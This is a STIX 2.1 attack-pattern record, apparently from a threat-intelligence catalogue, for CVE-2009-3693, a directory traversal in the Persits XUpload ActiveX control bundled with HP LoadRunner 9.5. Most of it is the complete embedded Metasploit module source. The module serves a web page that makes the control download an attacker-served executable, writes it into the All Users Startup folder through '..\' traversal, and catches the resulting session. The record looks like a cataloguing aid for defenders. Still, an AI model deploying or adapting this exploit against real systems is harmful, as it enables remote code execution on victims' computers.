{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24a68f54-9ed9-4563-8958-8dd6c2ce3028",
    "created": "2024-08-14T16:43:03.80015Z",
    "modified": "2024-08-14T16:43:03.800153Z",
    "name": "Persits XUpload ActiveX MakeHttpRequest Directory Traversal",
    "description": " This module exploits a directory traversal in Persits Software Inc's XUpload ActiveX control(version 3.0.0.3) that's included in HP LoadRunner 9.5. By passing a string containing \"..\\\\\" sequences to the MakeHttpRequest method an attacker is able to write arbitrary files to arbitrary locations on disk.  Code execution occurs by writing to the All Users Startup Programs directory. You may want to combine this module with the use of exploit/multi/handler since a user would have to log for the payload to execute.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/persits_xupload_traversal.rb",
            "external_id": "persits_xupload_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3693"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Persits XUpload ActiveX MakeHttpRequest Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal in Persits Software Inc's\n        XUpload ActiveX control(version 3.0.0.3) that's included in HP LoadRunner 9.5.\n        By passing a string containing \"..\\\\\" sequences to the MakeHttpRequest method,\n        an attacker is able to write arbitrary files to arbitrary locations on disk.\n\n        Code execution occurs by writing to the All Users Startup Programs directory.\n        You may want to combine this module with the use of exploit/multi/handler since a\n        user would have to log for the payload to execute.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3693'],\n          [ 'OSVDB', '60001']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic',  { } ],\n        ],\n      'DisclosureDate' => '2009-09-29',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true, 'The path to place the executable.', '../../../Documents and Settings/All Users/Start Menu/Programs/Startup/']),\n      ])\n  end\n\n  def on_request_uri(cli, request)\n\n    uri,token = request.uri.split('?', 2)\n\n    print_status(\"request fired : #{uri}\")\n\n    if !token\n      # randomize some stuff\n      objid = rand_text_alpha(rand(100) + 1)\n      func = rand_text_alpha(rand(100) + 1)\n\n      # send the html that makes the payload get downloaded\n      token = rand_text_numeric(32)\n      if (\"/\" == get_resource[-1,1])\n        exe_uri = get_resource[0, get_resource.length - 1]\n      else\n        exe_uri = get_resource\n      end\n      exe_uri << \"?\" + token\n\n      exe_host = \"\"\n      exe_host << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'])\n\n      exe_hostport = datastore['SRVPORT']\n\n      exe_name = datastore['PATH'].dup\n      exe_name << rand_text_alphanumeric(rand(100) + 1)\n      exe_name << \".exe\"\n\n      html = %Q|<html>\n<head>\n<script language='javascript'>\nfunction #{func}()\n{\n#{objid}.Server = \"#{exe_host}\";\n#{objid}.Script = \"#{exe_uri}\";\n#{objid}.Port = #{exe_hostport};\n#{objid}.MakeHttpRequest(\"\",\"\",\"#{exe_name}\",\"\",\"\")\n}\n</script>\n</head>\n<body onload='javascript:#{func}()'>\n<object classid='clsid:E87F6C8E-16C0-11D3-BEF7-009027438003' id=#{objid}></object>\n</body>\n</html>\n|\n      print_status(\"Sending #{self.name}\")\n\n      # Transmit the response to the client\n      send_response(cli, html,\n        {\n          'Connection'   => 'close',\n          'Pragma'       => 'no-cache'\n        })\n      return\n    end\n\n    print_status(\"Sending payload EXE\")\n    return if ((p = regenerate_payload(cli)) == nil)\n    data = generate_payload_exe({ :code => p.encoded })\n\n    # send the exe\n    send_response(cli, data,\n      {\n        'Content-Type' => 'application/octet-stream',\n        'Connection'   => 'close',\n        'Pragma'       => 'no-cache'\n      })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-29",
    "x_mitre_platforms": [
        "win'"
    ]
}